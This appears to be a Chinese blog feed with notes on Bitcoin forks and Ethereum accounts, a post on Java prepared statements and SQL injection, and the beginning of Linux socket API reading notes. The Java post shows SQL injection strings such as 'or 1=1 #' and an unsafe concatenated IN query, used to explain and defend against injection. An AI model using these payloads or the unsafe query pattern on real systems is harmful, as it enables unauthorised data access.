<p>说到更新其实离不开一个兼容性的问题，我在这个方面被小绕晕了一会，也简单谈谈 <strong>兼容性的异议</strong> <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>：</p>

<p>兼容性主要分为 <strong>向前兼容</strong>（<strong>Forward Compatibility</strong>）和 <strong>向后兼容</strong> （<strong>Backward Compatibility</strong>）两种，这里主要的异议在于英文中，<strong>前后</strong> 两词在时间上和空间上是统一的，比如 <strong>Forward</strong> 在空间上指前进，时间上指未来，而汉语中 『 前 』 在空间上指前进，时间上通常指以前，过去。</p>

<p>而正是这种差异，我也赞同知乎下面的一个评论，不如把这两者直译为：<strong>Forward Compatibility</strong> 兼容未来，<strong>Backward Compatibility</strong> 兼容过去。</p>

<blockquote>
  <p>兼容未来（<strong>Forward Compatibility</strong>）：指老的软件 / 硬件 兼容新的软件 / 硬件 的数据，如果在现实中会少一些，因为开发者需要在设计之初考虑各种情况，比如 HTML 页面就是兼容未来的，浏览器遇到新版本的 HTML语言时，即使有一些标签无法不支持，也会选择忽视正常使用，而比如 lambda 表达式是 java 8 所推新的特性，如果是java 5的编译器则会报错，这就是不兼容未来的例子。</p>

  <p>兼容过去（<strong>Backward Compatibility</strong> ）：指新的软件 / 硬件 兼容老的软件 / 硬件 的数据，这个在大部分的编程语言中都满足，即使有一些特性被删去，也只是给出一个 warning，并不影响正常编译使用。但很多软件就不这样，因为设计之初没有考虑到很多情况，可能必须要抛弃过去的一些特性，只能强行更新不兼容。</p>
</blockquote>

<p>好了刚刚我们聊的都是现实生活的例子，通常会有一个管理方或者平台分发更新的报告，而在加密货币体系中，去中心化的环境并没有严格的层次结构，所谓更新只是矿工们广义上达到的某种 <strong>共识</strong> 而已，比较不可能会有人顺着地址摸到矿工家里拿着枪逼他进行更新。</p>

<p>其实上面的两种兼容模式都是我另外补充的，肖臻老师在课堂上只用两个例子来描述软硬分叉，可能我理解能力比较差所以另外补充了一些知识进行概括，如果有不对的地方还望批评指正。</p>

<h3 id="硬分叉">硬分叉</h3>

<p>硬分叉用一句话概括就是 <strong>兼容过去，但不兼容未来</strong>。比特币协议修改后，未升级的节点不会认可这些修改，会认为这些特性是违法的，从而导致分叉，我们以一个具体的情况为例：</p>

<p>在BTC系统中，区块大小最大为1MB，可以包含的交易最大数量为4000笔左右。而一个区块产生大概需要10min左右，也就是说，整个比特币系统，平均每10分钟最多只能处理4000笔交易(平均每秒7笔交易)，严重影响了吞吐率和交易处理，所以有人认为可以增大区块大小，使得一个区块中包含的交易数变多，我们假设区块大小从1MB增大到8MB。</p>

<p>我们假设系统中大多数节点都进行了更新，只有少部分 <strong>守旧派</strong> 不愿意增大（区块增大也会导致网络传输变慢）。我们这里的<strong>大多数</strong>和<strong>少部分</strong>单纯指的是算力，而不是具体的人数。</p>

<p><img src="../../assets/images/image-20220624005710693.png" alt="image-20220624005710693" /></p>

<p>如上草图所示，图 1 为当前区块链，此时协议更新，绿色的新节点挖到了区块，如图2。但是对于旧节点来说因为不向未来兼容，它认为这是一个非法区块，故旧节点依旧照绿色区块前一个区块挖矿，如图三。</p>

<p>但是因为新节点的算力强，它会沿着上方的最长合法链进行挖矿，而对于旧节点来说，上方链上存在非法区块，不会认可该链，也沿着自己下方的链挖矿，可见这种分叉是持续性的，<strong>只要这部分旧节点不更新，下方的链就永远不会消失</strong>。</p>

<p>历史上BTC的分叉币BCH（比特币现金，区块大小为）就是这样硬分叉而来。而以太坊网络也同样发生过硬分叉，不过那是因为智能合约 THE DAO  存在<strong>重入漏洞</strong>，被黑客攻击后不得不以硬分叉的方式回滚交易，具体内容会在后续的以太坊中介绍。</p>

<h3 id="软分叉">软分叉</h3>

<p>关于软分叉的定义，其实我一直没有找到一个比较明确的结论，反而是在不同的资料上有不同的解释：大多数科普文章把软分叉归结于同时 <strong>兼容未来和兼容过去</strong>，即新旧节点可以完全共存在一条最长链上；而肖臻老师的讲义上举的例子是<strong>兼容未来，但不兼容过去</strong>。我暂且理解是否兼容过去取决于具体的协议变更，这么看维基百科上关于软分叉的描述可能更加规范<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>：</p>

<blockquote>
  <p>与硬分叉相比，软分叉所产生之区块能够被旧软件识别为有效区块，即区块 <a href="https://zh.wikipedia.org/wiki/向下兼容">向下兼容</a>。然而，旧软件所产生之区块则<strong>未必</strong>在新规则下有效。</p>
</blockquote>

<p>我们同样以区块大小为例，不过这次更新是把区块变小，从1MB变为0.5MB。</p>

<blockquote>
  <p>注意这里只是简单打了一个比方，实际上更新不是简单调整一个参数那么简单，因为是否兼容一定意义上就是取决于修改协议的部分。</p>
</blockquote>

<p>我们假设大多数节点进行了更新（即更新之后的节点算力超过 50%），如果软分叉满足兼容过去，那么应该会出现以下这种情况：</p>

<p><img src="../../assets/images/image-20220624134618348.png" alt="image-20220624134618348" /></p>

<p>虽然旧节点无法识别新规则到真实含义，但因为新节点满足合法的规则，所以新旧节点同处于一条链上，对整个系统的影响比较小。</p>

<p>但也有可能出现软分叉不兼容过去的情况，比如更新后的节点，可以拒绝大小超过0.5MB的区块：</p>

<p><img src="../../assets/images/image-20220624142213372.png" alt="image-20220624142213372" /></p>

<p>如果新节点不认可大于0.5MB的旧节点的话，认为其是一个非法区块，会从其前一个小区块开始，而旧节点一直被抛弃，不在最长合法链上，导致得不到出块奖励，最后逼迫旧节点升级，实现区块链上的所有矿工共同认可新协议，实现软件协议的升级。</p>

<p>比特币中的很多功能都是后续通过软分叉加入其中，比如在比特币系统中简单带过的 UTXO，就是通过软分叉写入到了 CoinBase域，旧节点认可新节点的区块，但是新节点检查旧节点 CoinBase域时发现并没有UTXO，则不会认可其发布的区块。不过更新也是一个慢慢迭代的过程，我们上面所举的例子也是站在已经有 50%的用户进行更新的前提下。</p>

<p>总结：</p>

<p>硬分叉：必须系统中所有节点更新软件，系统才不会产生永久性分叉，当出现更新时，硬分叉导致用户必须做出选择，会把社区一分为二。</p>

<p>软分叉：比较平稳，新的升级不会造成某种冲突，只需要实施某种限制，只要系统中一半以上的算力更新软件，系统就不会产生永久性分叉。</p>

<h1 id="以太坊">以太坊</h1>

<h2 id="以太坊概述">以太坊概述</h2>

<p>BTC成为区块链1.0，以太坊成为区块链2.0。以太坊的出现，弥补了之前我们所说区块链存在的一些不足，比如：</p>

<ol>
  <li>
    <p>挖矿时间</p>

    <blockquote>
      <p>比特币的出块时间为10min，很多人觉得这个时间太长了，在以太坊中大幅度见减小，改为10多秒。</p>
    </blockquote>
  </li>
  <li>
    <p>共识机制不同</p>

    <blockquote>
      <p>针对以太坊的出块时间，以太坊研究出了 『 基于 Ghost 协议 』的共识机制。</p>
    </blockquote>
  </li>
  <li>
    <p>mining puzzle</p>

    <blockquote>
      <p>比特币中的 mining puzzle 是纯暴力计算哈希，这样的结果是挖矿设备专业化。但这一定意义上违背了去中心化原则。以太坊的 mining puzzle 对内存是有一定要求的，这一定意义上限制了 ASIC 芯片的使用。</p>
    </blockquote>
  </li>
  <li>以太坊用权益证明(pos proof of stake)代替了 工作量证明(pow)。</li>
  <li>以太坊引入了对智能合约(smart contract)的支持。</li>
</ol>

<h2 id="以太坊账户">以太坊账户</h2>

<p>BTC系统是基于交易的账本，系统没有记录每个账户有多少钱，只能通过 UTXO 进行推算。</p>

<p>以太坊系统采用了账户的模式，和现实中的银行类似。</p>

<p>以太坊中，有两类账户：外部账户和内部账户。</p>

<ul>
  <li>外部账户（externally owned account），存有类似BTC系统中的公私钥对、余额和计数器。</li>
  <li>合约账户（smart contract account）：不能主动发起交易，只能接收到外部账户调用后才能发起交易或调用其他合约账户，其除了balance和nonce之外还有code(代码)、storage(相关状态-存储)。</li>
</ul>

<p>创建合约时会返回一个地址，通过地址即可调用。</p>

<h2 id="以太坊中的数据结构">以太坊中的数据结构</h2>

<h3 id="状态树">状态树</h3>

<h3 id="交易树">交易树</h3>

<h3 id="收据树">收据树</h3>

<p>2022 6.20</p>

<p>最近工作比较忙，以太坊这部分就先不整理了。</p>

<h2 id="参考">参考</h2>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>知乎：<a href="https://zhuanlan.zhihu.com/p/28195702">向前兼容与向后兼容</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>维基百科：<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%8F%89#%E8%BD%AF%E5%88%86%E5%8F%89">软分叉</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>]]></content><author><name>Theoyu</name></author><category term="cource" /><category term="cource" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">浅谈Java预编译</title><link href="https://theoyu.top/2022/Java-Prepstatementared" rel="alternate" type="text/html" title="浅谈Java预编译" /><published>2022-04-27T00:00:00+08:00</published><updated>2022-04-27T00:00:00+08:00</updated><id>https://theoyu.top/2022/Java-Prepstatementared</id><content type="html" xml:base="https://theoyu.top/2022/Java-Prepstatementared"><![CDATA[<p>之前面试问到了预编译相关的问题，感觉回答的不是很好，通过几个例子深入学习一下。</p>

<!--more-->

<p>Java预编译分服务端预编译和客户端预编译两种，对应的url参数为<code class="language-plaintext highlighter-rouge">useServerPrepStmts</code>，其为true时是在数据库服务端预编译，其为false则是在驱动包内进行的处理。</p>

<h2 id="服务端预编译">服务端预编译</h2>

<p>先简单摘要一下数据库SQL语句的编译特性：</p>

<blockquote>
  <p>数据库接受到sql语句之后，需要检查缓存、规则验证（<strong>词法和语义解析</strong>）、解析器解析为语法树、预处理器进一步验证语法树、优化SQL、生成执行计划、执行。这几个阶段和我们一些高级语言的解释执行差不多是一个道理。</p>

  <p>但很多时候，我们一条SQL语句可能会执行多次，每次执行可能只是个别的值不一样（比如query的where子句不一样），如果每次都经过上面重复的步骤，效率就会比较低了，因为对其中对语法的解析和优化的过程其实是与传入的字段值无关</p>

  <p>所以预编译使用占位符?代替字段值的部分，将SQL语句先交由数据库预处理，构建语法树，再传入真正的字段值多次执行，省却了重复解析和优化相同语法树的时间，提升了SQL执行的效率。</p>
</blockquote>

<p>我们使用以下三条语句就可以简单在Mysql上使用预编译：</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">prepare</span> <span class="n">stmt</span> <span class="k">from</span> <span class="s1">'select * from users where username = ?'</span><span class="p">;</span>
<span class="k">set</span> <span class="o">@</span><span class="n">username</span><span class="o">=</span><span class="nv">"admin"</span><span class="p">;</span>
<span class="k">execute</span> <span class="n">stmt</span> <span class="k">using</span> <span class="o">@</span><span class="n">username</span><span class="p">;</span>
</code></pre></div></div>

<p>其对应的Java代码为：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130250.png" alt="image-20220428005016462" /></p>

<p>我们通过Wireshark可以发现的确是在服务端进行了处理：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130252.png" alt="image-20220428005148389" /></p>

<p>那如果我们传入的username带一个单引号，预编译会怎么处理呢？</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130253.png" alt="image-20220428005407244" /></p>

<p>可以看到mysql服务端对我们传入的字段进行了转义，规避了单引号的闭合。不过说到底预编译的本身目的还是为了性能和效率，我认为其预防SQL注入只是处理时加上的一个特性而已（埋一个坑，有机会去看看Mysql源码）。</p>

<h2 id="客户端预编译">客户端预编译</h2>

<p>在<code class="language-plaintext highlighter-rouge">connnect</code>连接时，不设置<strong>useServerPrepStmts</strong>（默认为false），则采用的是驱动包（<strong>mysql-connector-java</strong>）内的处理。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130256.png" alt="image-20220428093236263" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130300.png" alt="image-20220428094239596" /></p>

<p>上图可以看到我们传入的<code class="language-plaintext highlighter-rouge">admin'</code>被处理为了<code class="language-plaintext highlighter-rouge">'admin'''</code>，最外层的单引号是本身会加上的，不过预处理把我们额外添加的单引号后又追加了一个单引号，规避了其闭合。同时注意一点wireshark抓包可见在服务端并没有 <strong>Prepare</strong>的处理。</p>

<p>我们在  <code class="language-plaintext highlighter-rouge">preparedStatement.setString(1,username);</code>处打下断点，定位到<code class="language-plaintext highlighter-rouge">ClientPreparedQueryBindings.setString</code>:</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130302.png" alt="image-20220428130231581" /></p>

<p>逻辑其实很简单，先是对检查传入的字符串室友存在<strong>Escaped</strong>字符，如果存在则根据具体情况处理，最后再往前后添加单引号。其实简单来看也相当于是一个消毒处理。</p>

<p>之前说到客户端处的预编译并没有往服务端请求，相当于只是本地的一个缓存，那我们可以手动修改<code class="language-plaintext highlighter-rouge">SetValue </code>的值，来观察之后数据库的执行。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">final</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="kt">int</span> <span class="n">paramIndex</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">val</span><span class="o">,</span> <span class="nc">MysqlType</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">bindValues</span><span class="o">[</span><span class="n">paramIndex</span><span class="o">].</span><span class="na">setByteValue</span><span class="o">(</span><span class="n">val</span><span class="o">);</span>
    <span class="k">this</span><span class="o">.</span><span class="na">bindValues</span><span class="o">[</span><span class="n">paramIndex</span><span class="o">].</span><span class="na">setMysqlType</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>从 <strong>setValue</strong> 来看我们最后设置的值存储在来 <strong>bindValues</strong> ，因为我们是通过<code class="language-plaintext highlighter-rouge">Class.forName</code>载入驱动包，所以需要通过反射修改其值，不过也可以在Debug的过程中用idea修改：</p>

<pre><code class="language-txt">'' or 1=1 #
39 39 32 79 82 32 49 61 49 32 35 
</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130305.png" alt="image-20220427214109417" /></p>

<p>监控的执行情况：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130310.png" alt="image-20220427214524712" /></p>

<p>发现数据库的确是执行了注入语句，打印了所有users信息。</p>

<p>抛开编译、AST等知识，站在安全的角度来说我认为预编译之所以能防御sql注入还是一个消毒函数的问题，本质上还是通过转义、追加等方式来规避单引号的闭合，从而让数据段和代码段不会混淆。</p>

<h2 id="预编译所需要注意的几点">预编译所需要注意的几点</h2>

<p>如果你在面试的时候简单说一句预编译，那伯分之伯还会追问一句使用预编译需要注意哪些地方，</p>

<h3 id="可能出错的地方">可能出错的地方</h3>

<p>这一部分主要是一些特殊的地方，预编译的写法需要注意。</p>

<h4 id="like语句">like语句</h4>

<p>以下两种写法都可以：</p>

<ol>
  <li>使用<code class="language-plaintext highlighter-rouge">concat</code>拼接</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where username like concat('%',?,'%')\n "</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="s">"a"</span><span class="o">);</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<ol>
  <li>在setString中再添加</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where username like ? "</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="s">"%a%"</span><span class="o">);</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<h4 id="in语句">in语句</h4>

<p>错误的写法：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">ids</span> <span class="o">=</span> <span class="s">"1,2"</span><span class="o">;</span>
<span class="c1">//String ids = "1,2) or 1=1#";</span>
<span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where id in ("</span><span class="o">+</span><span class="n">ids</span><span class="o">+</span><span class="s">")"</span><span class="o">;</span>
<span class="nc">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span><span class="o">=</span>  <span class="n">statement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
</code></pre></div></div>

<p>in语句的预编译，我们需要确定预编译的个数，这里采用分隔符的方法区分。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">StringBuilder</span> <span class="n">temp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="nc">String</span> <span class="n">ids</span> <span class="o">=</span> <span class="s">"1,2"</span><span class="o">;</span>
<span class="c1">// String ids = "1,2) or 1=1#,3";</span>
<span class="nc">String</span><span class="o">[]</span>  <span class="n">splitIds</span> <span class="o">=</span> <span class="n">ids</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">","</span><span class="o">);</span>
<span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">splitIds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span>
    <span class="k">if</span><span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span>
        <span class="n">temp</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"?"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">temp</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">",?"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where id in ("</span><span class="o">+</span><span class="n">temp</span><span class="o">+</span><span class="s">")"</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>

<span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">splitIds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span>
    <span class="n">preparedStatement</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">splitIds</span><span class="o">[</span><span class="n">i</span><span class="o">]));</span>
<span class="o">}</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<h3 id="无法使用预编译的场景">无法使用预编译的场景</h3>

<p>这一方面也同样可以通过服务端和客户端两个方面回答。</p>

<p>首先是服务端，看看尝试对查询的表名进行预编译：</p>

<p><code class="language-plaintext highlighter-rouge">prepare stmt from 'select * from ? where username = ?';</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193632.png" alt="image-20220428135058981" /></p>

<p>发现报错了，其实很好理解，<strong>表名和列名是不能够被预编译的</strong>，因为生成语法树的过程中，预处理器在进一步检查解析后的语法树时，<strong>检查数据表和数据列是否存在</strong>，如果这两个值是占位符<code class="language-plaintext highlighter-rouge">	?</code>所代替，自然会报错。</p>

<p>从驱动包的角度，之前所说java预编译会在占位符前后自动添加两个单引号，那么如果我们执行以下的语句：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193629.png" alt="image-20220428135913397" /></p>

<p>实际上执行的语句为：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193627.png" alt="image-20220428140036366" /></p>

<p>Mysql表名不允许使用单引号，所以会报语法错误。</p>

<p>那列名呢，当然也是不行，比如<code class="language-plaintext highlighter-rouge">select username from users where 'user_id' = 1 </code>，这里会把<code class="language-plaintext highlighter-rouge">'user_id'</code>当作一个具体的值而不是列名，从而导致执行结果不一致。</p>

<p>直接增删改查的表名列名不行，同理像类似order by的地方，需要用到列名来排序的地方同样不行。</p>

<p>针对上述几种情况，比较好的方式还是使用白名单，毕竟表名和列名大多时候是我们提前确定的值。</p>]]></content><author><name>Theoyu</name></author><category term="JAVA" /><summary type="html"><![CDATA[之前面试问到了预编译相关的问题，感觉回答的不是很好，通过几个例子深入学习一下。]]></summary></entry><entry><title type="html">『Linux高性能服务器编程』读书笔记</title><link href="https://theoyu.top/2022/cource/LinuxServerProgram" rel="alternate" type="text/html" title="『Linux高性能服务器编程』读书笔记" /><published>2022-04-26T00:00:00+08:00</published><updated>2022-04-26T00:00:00+08:00</updated><id>https://theoyu.top/2022/cource/LinuxServerProgram</id><content type="html" xml:base="https://theoyu.top/2022/cource/LinuxServerProgram"><![CDATA[<!--more-->

<p>大二买了这本书一直没看，最近有Linux这门课还是简单记录了一下（纯纯API翻译小能手）。感觉虽然涉及的知识比较全，但是一些我觉得比较重要的点却是一笔带过了，不过好在在APUE和UNP中都找到了答案。</p>

<h2 id="基础api">基础API</h2>

<h3 id="socket基础api">socket基础API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 主机序和网络字节序转换</span>
<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="nf">htonl</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">hostlong</span><span class="p">);</span> <span class="c1">// host to network long</span>
<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="nf">htons</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">hostlong</span><span class="p">);</span> <span class="c1">// host to network short</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="nf">ntonhl</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">netlong</span><span class="p">);</span><span class="c1">//network to host long </span>
<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="nf">ntohs</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">netlong</span><span class="p">);</span><span class="c1">//network to host short </span>
  
<span class="c1">//2. socket地址</span>
<span class="c1">//2.1 通用socket结构 sockaddr</span>
<span class="k">struct</span> <span class="nc">sockaddr</span>
  <span class="p">{</span>
    <span class="n">sa_family_t</span> <span class="n">sa_family</span><span class="p">;</span>	<span class="cm">/* 地址族，AF_XXX  */</span>
    <span class="kt">char</span> <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>		<span class="cm">/* Address data.包含目的地址和端口信息  */</span>
  <span class="p">};</span>
<span class="cm">/*
  sa_family: 2字节地址族：
    AF_UNIX :UNIX本地地址族
    AF_INET :TCP/IPv4地址族
    AF_INET6:TCP/IPv6地址族
*/</span>

<span class="c1">//2.2 专用socket结构 sockaddr_in，与前者相比把port和addr分开存储到了两个变量中</span>
<span class="k">struct</span> <span class="nc">sockaddr_in</span>
  <span class="p">{</span>
    <span class="n">sa_family_t</span> <span class="n">sin_family</span><span class="p">;</span>     <span class="cm">/* 地址族，AF_XXX  */</span>
    <span class="n">in_port_t</span> <span class="n">sin_port</span><span class="p">;</span>			<span class="cm">/* 端口号，要用网络字节序*/</span>
    <span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>	<span class="cm">/* IPv4地址结构体，见↓ */</span>
  <span class="p">};</span>
<span class="c1">//存储IPv4的数据结构</span>
<span class="k">struct</span> <span class="nc">in_addr</span>
  <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">s_addr</span><span class="p">;</span> <span class="cm">/* IPv4地址，要用网络字节序表示*/</span>
  <span class="p">};</span>


<span class="c1">//3. IP地址转换函数</span>
<span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span><span class="c1">// 将点分十进制字符串的IPv4地址, 转换为网络字节序整数表示的IPv4地址. 失败返回INADDR_NONE</span>
<span class="n">in_addr_t</span> <span class="nf">inet_addr</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">strptr</span><span class="p">);</span>
<span class="cm">/*例如：*/</span> <span class="n">sockaddr_in</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="o">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
 
<span class="c1">// 功能相同不过转换结果存在 inp指向的结构体中. 成功返回1 反之返回0</span>
<span class="kt">int</span> <span class="nf">inet_aton</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cp</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">in_addr</span><span class="o">*</span> <span class="n">inp</span><span class="p">);</span>

<span class="c1">//将IPv4地址转化为点分十进制IP地址字符串，和上述两个函数功能相反</span>
<span class="c1">//该函数使用一个内部静态存储转化结果，函数返回值指向该静态内存，所以此函数是不可重入的！</span>
<span class="kt">char</span><span class="o">*</span> <span class="nf">inet_ntoa</span><span class="p">(</span><span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">in</span><span class="p">);</span> 

<span class="c1">//以下函数也能完成前面3个函数同样的功能，并且同时适用于IPv4和IPv6</span>
<span class="c1">//将点分十进制或者十六进制IP地址转化为网络字节序表示的地址</span>
<span class="kt">int</span> <span class="nf">inet_pton</span><span class="p">(</span><span class="kt">int</span> <span class="n">af</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">dst</span><span class="p">);</span>
<span class="cm">/*
  af:地址族 AF_INET or AF_INET6
  src:IP地址
  dst:转化的地址
  成功返回1，失败返回0并设置errno
*/</span>
<span class="c1">//和上述功能相反</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">inet_ntop</span><span class="p">(</span><span class="kt">int</span> <span class="n">af</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span>  <span class="n">src</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">cnt</span><span class="p">);</span>
<span class="cm">/*
  前三者和inet_pton一样，src和dst交换了顺序
  cnt指定目标存储单元大小，可用INET_ADDRSTRLEN, INET6_ADDRSTRLEN表示
*/</span>

<span class="c1">//4. 创建socket</span>
<span class="kt">int</span> <span class="nf">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">);</span>
<span class="cm">/*
  domain:底层协议族
    PF_UNIX :UNIX本地协议族
    PF_INET :TCP/IPv4协议族
    PF_INET6:TCP/IPv6协议族
    (地址族和协议族事实上是一一对应的，在前UNIX时代有所区分，在Linux上已完全兼容，不过为了规范区分一下也行)
  type:通讯类型(服务类型)
    SOCK_STREAM(流服务，TCP协议)
    SOCK_DGRAM(数据报服务，UDP类型)
  protocol:通常为0
  socket调用成功时返回一个socket文件描述符，失败返回-1并设置errno
*/</span>

<span class="c1">//5. 命名socket</span>
<span class="c1">//作用于服务端，将一个socket和socket地址进行绑定称为给socket命名</span>
